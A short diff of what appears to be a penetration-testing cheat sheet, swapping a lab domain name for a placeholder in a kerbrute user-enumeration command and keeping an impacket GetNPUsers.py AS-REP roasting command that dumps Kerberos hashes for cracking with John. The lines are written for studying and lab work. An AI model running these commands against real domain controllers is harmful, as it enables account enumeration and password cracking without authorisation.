@@ -1,5 +1,5 @@
 #Brute Force
-./kerbrute_linux_amd64  userenum -d blackfield.local --dc domain.local users.txt 
+./kerbrute_linux_amd64  userenum -d domain.local --dc domain.local users.txt 
 
 #ASREPRoast
 GetNPUsers.py domain.local/ -usersfile valid_users.txt -dc-ip 0.0.0.0 -format john
